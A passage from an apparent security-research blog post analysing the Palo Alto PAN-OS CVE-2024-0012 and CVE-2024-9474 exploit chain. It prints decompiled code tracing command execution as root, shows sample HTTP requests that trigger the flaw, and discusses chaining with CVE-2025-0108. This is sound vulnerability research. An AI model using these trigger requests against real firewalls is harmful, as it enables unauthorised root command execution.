        <span data-label-text="C++"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>		<span class="c1">// 获取用户信息</span>
    <span class="n">pan_cfg_get_username_by_cookie</span><span class="p">(</span><span class="n">param_10</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar8</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">),</span><span class="n">local_88</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
    <span class="n">iVar2</span> <span class="o">=</span> <span class="n">pan_cfg_get_adminrole_by_cookie</span><span class="p">(</span><span class="n">param_10</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar8</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">));</span>
    
    <span class="c1">// 处理异步模式</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">param_17</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">lVar8</span> <span class="o">=</span> <span class="n">xmlHasProp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_11</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span><span class="s">"async-mode"</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">lVar8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">lVar8</span> <span class="o">=</span> <span class="n">xmlGetProp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_11</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span><span class="s">"jobid"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lVar8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="c1">// 如果有jobid，将其导出到环境变量</span>
          <span class="n">pan_string_buffer_appendf</span><span class="p">(</span><span class="n">lVar5</span><span class="p">,</span><span class="s">"export jobid=</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">;"</span><span class="p">,</span><span class="n">lVar8</span><span class="p">);</span>
          <span class="p">(</span><span class="o">*</span><span class="n">_xmlFree</span><span class="p">)(</span><span class="n">lVar8</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="n">uVar10</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">param_17</span><span class="p">;</span>
    <span class="c1">// 获取命令执行环境</span>
    <span class="n">uVar7</span> <span class="o">=</span> <span class="n">pan_op_ctxt_get_env</span><span class="p">(</span><span class="n">param_12</span><span class="p">,</span><span class="n">lVar5</span><span class="p">,</span><span class="n">local_88</span><span class="p">,</span><span class="n">iVar2</span><span class="p">,</span><span class="n">param_17</span><span class="p">);</span>
    <span class="n">pcVar9</span> <span class="o">=</span> 
    <span class="s">"&lt;response status=</span><span class="se">\"</span><span class="s">error</span><span class="se">\"</span><span class="s">&gt;&lt;msg&gt;&lt;line&gt;Unable to construct operational command&lt;/line&gt;&lt;/msg&gt;&lt;/response&gt;"</span><span class="p">;</span>
    <span class="n">uVar6</span> <span class="o">=</span> <span class="n">extraout_XMM0_Qa_03</span><span class="p">;</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar7</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// 添加用户提供的命令/脚本到缓冲区</span>
      <span class="n">pan_string_buffer_append</span><span class="p">(</span><span class="n">lVar5</span><span class="p">,</span><span class="n">param_13</span><span class="p">);</span>
      
      <span class="n">iVar2</span> <span class="o">=</span> <span class="n">pan_get_system_cmd_output</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar5</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span><span class="n">lVar4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_8a</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/20250424/image12.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image12.png" alt="image.png" loading="lazy"></a></p>

<p>pan_get_system_cmd_output triggers the payload by calling pan_get_system_cmd_output_impl and then using execv within the pan_popen_no_stderr method in linpancommon_map.so.</p>

<div class="language-c++ highlighter-rouge"><div class="code-header">
        <span data-label-text="C++"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
</pre></td><td class="rouge-code"><pre><span class="cm">/**
 * pan_popen_no_stderr - 类似popen函数，执行命令但不处理标准错误输出
 * 创建一个管道并执行指定的命令，允许调用进程读取命令的标准输出
 * @param_1: 要执行的命令路径
 * @param_2: 命令的参数数组
 * @return: 返回指向管道读取端的FILE指针，失败返回NULL
 */</span>
<span class="kt">FILE</span> <span class="o">*</span> <span class="nf">pan_popen_no_stderr</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">param_2</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>               <span class="c1">// 存储函数返回值</span>
  <span class="n">__pid_t</span> <span class="n">_Var2</span><span class="p">;</span>           <span class="c1">// 存储子进程PID</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">pFVar3</span><span class="p">;</span>            <span class="c1">// 用于管理子进程的文件结构</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>       <span class="c1">// 栈保护值</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_30</span><span class="p">;</span>          <span class="c1">// 指向管道读取端的FILE指针</span>
  <span class="kt">int</span> <span class="n">local_28</span><span class="p">;</span>            <span class="c1">// 管道的读取端文件描述符</span>
  <span class="kt">int</span> <span class="n">local_24</span><span class="p">;</span>            <span class="c1">// 管道的写入端文件描述符</span>
  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>           <span class="c1">// 栈检查变量</span>
  
  <span class="c1">// 栈保护初始化</span>
  <span class="n">local_20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="c1">// 分配一个FILE结构体用于管理子进程</span>
  <span class="n">pFVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
  <span class="n">local_30</span> <span class="o">=</span> <span class="n">pFVar3</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pFVar3</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 创建管道</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">pipe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_28</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// 将管道读取端转换为FILE流</span>
      <span class="n">local_30</span> <span class="o">=</span> <span class="n">fdopen</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">==</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 如果转换失败，关闭管道的两端</span>
        <span class="n">close</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">local_24</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// 锁定互斥锁避免竞态条件</span>
        <span class="n">pthread_mutex_lock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
        <span class="c1">// 创建子进程</span>
        <span class="n">_Var2</span> <span class="o">=</span> <span class="n">vfork</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_Var2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="c1">// 这是子进程代码</span>
          <span class="c1">// 关闭管道读取端</span>
          <span class="n">close</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
          <span class="n">pFVar3</span> <span class="o">=</span> <span class="n">DAT_009ea120</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// 将管道写入端复制到标准输出</span>
            <span class="n">dup2</span><span class="p">(</span><span class="n">local_24</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
            <span class="n">close</span><span class="p">(</span><span class="n">local_24</span><span class="p">);</span>
            <span class="n">pFVar3</span> <span class="o">=</span> <span class="n">DAT_009ea120</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="c1">// 关闭所有打开的文件描述符</span>
          <span class="k">for</span> <span class="p">(;</span> <span class="n">pFVar3</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span> <span class="n">pFVar3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">**</span><span class="p">)</span><span class="n">pFVar3</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">fileno</span><span class="p">((</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">pFVar3</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">);</span>
            <span class="n">close</span><span class="p">(</span><span class="n">iVar1</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="c1">// 执行指定的命令 - 这里是执行命令的关键部分</span>
          <span class="n">execv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">);</span>
          <span class="c1">// 如果execv返回，表示出错</span>
          <span class="n">_exit</span><span class="p">(</span><span class="mh">0x7f</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// 父进程继续执行</span>
        <span class="n">pthread_mutex_unlock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
        <span class="c1">// 关闭管道写入端</span>
        <span class="n">close</span><span class="p">(</span><span class="n">local_24</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="n">_Var2</span><span class="p">)</span> <span class="p">{</span>
          <span class="c1">// 保存子进程的信息</span>
          <span class="o">*</span><span class="p">(</span><span class="n">__pid_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pFVar3</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">_Var2</span><span class="p">;</span>
          <span class="n">pFVar3</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_30</span><span class="p">;</span>
          <span class="n">pthread_mutex_lock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
          <span class="c1">// 将进程添加到进程列表中</span>
          <span class="o">*</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">**</span><span class="p">)</span><span class="n">pFVar3</span> <span class="o">=</span> <span class="n">DAT_009ea120</span><span class="p">;</span>
          <span class="n">DAT_009ea120</span> <span class="o">=</span> <span class="n">pFVar3</span><span class="p">;</span>
          <span class="n">pthread_mutex_unlock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
          <span class="k">goto</span> <span class="n">LAB_005c4430</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">fclose</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">free</span><span class="p">(</span><span class="n">pFVar3</span><span class="p">);</span>
    <span class="n">local_30</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
  <span class="p">}</span>
<span class="n">LAB_005c4430</span><span class="o">:</span>
  <span class="c1">// 栈保护检查</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">__stack_chk_fail</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">local_30</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>With the payload’s execution point in mind, let’s go back and look at how the exploit was triggered. We ended up locating the PA’s <code class="language-plaintext highlighter-rouge">show chassis-ready</code> command (and some other commands as well), which is used to display the hardware status of the device, including whether the dataplane is ready to handle traffic and whether the running policy is loaded. When this command is executed</p>

<p>The Palo Alto Firewall checks the status of the dataplane configuration by running /usr/local/bin/sdb -n cfgpush.s1.comm.config-exist in parallel through multiple sub-processes and converts the results to yes or no output.</p>

<p><a href="/assets/img/20250424/image13.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image13.png" alt="image.png" loading="lazy"></a></p>

<p>Subsequently in the PHP code, we found the getDataPlaneStatus method in the htdocs/php/include/Util.php file, which is called on the system by getVariables in htdocs/php/include/ContextVariables.php The method is called by getVariables.php in the system.</p>

<p><a href="/assets/img/20250424/image14.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image14.png" alt="image.png" loading="lazy"></a></p>

<p>The runOpCommand method is the core function used to execute operation commands in the Palo Alto Networks firewall management interface and is one of the key interfaces for communicating with the PAN-OS XML API. The method takes two parameters: an XML format string containing the operation command to be executed ($operation) and optional additional attribute parameters ($attributes).</p>

<p>During the request construction process, the system calls XmlRequest::op($operation, $attributes) to create a complete XML request. This request is formatted into a specific XML structure and session cookies and other necessary request attributes are added.</p>

<p>When communicating with the Management Server, the request is sent to the PAN-OS Management Server via Backend::getArray(). The underlying implementation uses the MSConnection class to communicate with the local management server over a TCP socket (default port 10000.) MSConnection is responsible for establishing the connection, sending the request header and payload, and receiving and processing the response.</p>

<p>Therefore, we can quickly try to trigger the vulnerability by locating the call to ContextVariables::getVariables().</p>

<p><a href="/assets/img/20250424/image15.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image15.png" alt="image.png" loading="lazy"></a></p>

<p>For example, the following request could trigger this vulnerability:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/php/device/export.file.php?type=techsupport</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.251</span>
<span class="na">cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9f56ts27jh56hh8pgrl3nhkmkq;</span>

</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/20250424/image16.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image16.png" alt="image.png" loading="lazy"></a></p>

<p>Similarly, the principle of triggering the vulnerability in index.php is the same - the Page::printDynamicContext() method in index.php calls ContextVariables::getVariables(). We can find more entry points that could trigger the vulnerability by looking for other locations where Page::printDynamicContext() is called.</p>

<p><a href="/assets/img/20250424/image17.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image17.png" alt="image.png" loading="lazy"></a></p>

<p>For example, the following request could trigger the vulnerability:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/unauth/php/change_password.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.251</span>
<span class="na">cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9f56ts27jh56hh8pgrl3nhkmkq;</span>

</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/20250424/image18.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image18.png" alt="image.png" loading="lazy"></a></p>

<p>Since configd is running with root privileges, when a privilege bypass is performed via low-privilege nginx, the effect of elevation of privilege is achieved after a payload is triggered in configd.</p>

<h2 id="thought-exploit-in-combination-with-cve-2025-0108"><span class="me-2"><strong>Thought: exploit in combination with CVE-2025-0108?</strong></span><a href="#thought-exploit-in-combination-with-cve-2025-0108" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>After CVE-2025-0108 was published, I spent a long time thinking whether it could be exploited in combination with CVE-2024-9474. However, this attempt naturally ended in failure.</p>

<p><a href="/assets/img/20250424/image19.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image19.png" alt="image.png" loading="lazy"></a></p>

<p>The previous analysis did not describe panCreateRemoteAppwebSession too much, in fact, this function is mainly used to create a session, which is also the key to be able to write payloads.</p>

<p>The definition of <code class="language-plaintext highlighter-rouge">panCreateRemoteAppwebSession</code> cannot be found in the PHP source code, the function is actually defined in the <code class="language-plaintext highlighter-rouge">panhttpdmodule.so</code> module.</p>

<p><a href="/assets/img/20250424/image20.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image20.png" alt="image.png" loading="lazy"></a></p>

<p>The function first gets the remote host address (REMOTE_HOST) from which the request was made using the pan_php_SERVER_get_str function, and then checks to see if it is a trusted local loopback address. It verifies that the remote address matches any of the following local loopbacks in turn: “127.0.0.1” (IPv4 local loopback), “::1” (IPv6 short form), or “0:0:0:0:0:0:0:1” (IPv6 full form). If the remote address does not match any of these local loopback addresses, the program performs additional validation logic.</p>

<p>Due to space constraints and the fact that there are many excellent articles analyzing CVE-2025-0108, I will not go into the details here. I won’t go into too much detail here. X-Forwarded-For is set in proxy_default.conf.</p>

<p>When a client request arrives at Nginx, Nginx checks to see if the request contains the X-Forwarded-For header. If the request already contains this header, <code class="language-plaintext highlighter-rouge">$proxy_add_x_forwarded_for</code> appends the client’s actual IP address to the existing value in the format: original X-Forwarded-For value, <code class="language-plaintext highlighter-rouge">$remote_addr</code>. If the request does not contain the X-Forwarded-For header, the $proxy_add_x_forwarded_for value is appended to the existing value. x_forwarded_for value will be directly equal to <code class="language-plaintext highlighter-rouge">$remote_addr</code> (the client’s IP address).</p>

<p><a href="/assets/img/20250424/image21.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image21.png" alt="image.png" loading="lazy"></a></p>

<p><a href="/assets/img/20250424/image22.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image22.png" alt="image.png" loading="lazy"></a></p>

<p>However, in a real-world environment, we found that the checking mechanism in the <code class="language-plaintext highlighter-rouge">panCreateRemoteAppwebSession</code> function is strictly dependent on the integrity of the X-Forwarded-For header. Even if we were able to achieve authentication bypass via CVE-2025-0108, due to Nginx’s strict header handling and forwarding mechanism, it is difficult to directly manipulate the internal service to think that the request is coming from 127.0.0.1. This makes it still difficult to directly combine the two vulnerabilities for exploitation.</p>

<p>However, in a bulletin about CVE-2025-0108, Palo Alto noted that “Palo Alto Networks discovered that attackers are attempting to chain CVE-2025-0108, CVE-2024-9474, and CVE-2025-0111, targeting unpatched and unprotected PAN-OS Web management interface.”</p>

<p><a href="/assets/img/20250424/image23.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image23.png" alt="image.png" loading="lazy"></a></p>

<p>There is also a never-before-seen CVE-2025-0111 certified file-reading vulnerability, a file-reading vulnerability that may be the final key to unlocking Pandora’s Box.</p>

<h2 id="summary"><span class="me-2"><strong>Summary</strong></span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>This article provides an in-depth analysis of several important security vulnerabilities in Palo Alto Networks firewall and SSL VPN products. It first explored the CVE-2024-0012 authentication bypass vulnerability, which exists in the authentication mechanism that handles requests ending in .js.map. The CVE-2024-9474 elevation of privilege vulnerability is then analyzed in detail, especially the implementation details of the panCreateRemoteAppwebSession function involved and the vulnerability triggering mechanism.</p>

<p>It was found that the exploit chain can be triggered by commands such as “show chassis-ready”. This process involves the interaction of multiple components, including Nginx, Apache, and the internal management server. The article also explores specific trigger points for the vulnerability, including multiple entry points such as export.file.php and change_password.php.</p>

<p>When attempting to combine the newly discovered CVE-2025-0108 with CVE-2024-9474, it was found to be difficult due to Nginx’s strict header handling mechanism. However, Palo Alto’s latest security bulletin mentions that attackers are attempting to chain CVE-2025-0108, CVE-2024-9474, and CVE-2025-0111, which hints at the possibility of a more complex exploit chain.</p>

<h2 id="refer-to"><span class="me-2">Refer to</span><a href="#refer-to" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/</li>
  <li>http://php.net/auto-prepend-file</li>
  <li><a href="https://attackerkb.com/topics/n8GmwEZA1k/cve-2024-9474?referrer=search">https://attackerkb.com/topics/n8GmwEZA1k/cve-2024-9474</a></li>
  <li>https://security.paloaltonetworks.com/CVE-2025-0111</li>
  <li>https://security.paloaltonetworks.com/CVE-2025-0108</li>
  <li>https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E5%9C%A8%E6%95%85%E4%BA%8B%E4%B9%8B%E5%89%8D</li>
  <li>https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/</li>
  <li>https://nginx.org/en/docs/http/ngx_http_proxy_module.html</li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/vulnerability/">vulnerability</a>,
          <a href="/categories/palo-alto-networks-pan-os/">Palo-Alto-Networks-PAN-OS</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/palo-alto-networks-pan-os/"
            class="post-tag no-text-decoration"
          >Palo-Alto-Networks-PAN-OS</a>
        
          <a
            href="/tags/rce/"
            class="post-tag no-text-decoration"
          >RCE</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=From%20CVE-2024-0012%20to%20CVE-2024-9474%20%20Analysis%20and%20Reflections%20on%20Palo%20Alto%20-%20imjdl%20blog&url=%2Fposts%2Fpa%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=From%20CVE-2024-0012%20to%20CVE-2024-9474%20%20Analysis%20and%20Reflections%20on%20Palo%20Alto%20-%20imjdl%20blog&u=%2Fposts%2Fpa%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=%2Fposts%2Fpa%2F&text=From%20CVE-2024-0012%20to%20CVE-2024-9474%20%20Analysis%20and%20Reflections%20on%20Palo%20Alto%20-%20imjdl%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2025-55182/">CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/pa/">From CVE-2024-0012 to CVE-2024-9474  Analysis and Reflections on Palo Alto</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/version/">Practicing Version Recognition Technology in Critical Devices</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/mcp/">Security Challenges in the Popularization of MCP Services</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/simple-help/">Vulnerability Review:CVE-2024-57727 Simple Help Unauthenticated Path Traversal Vulnerability</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/">空间测绘</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
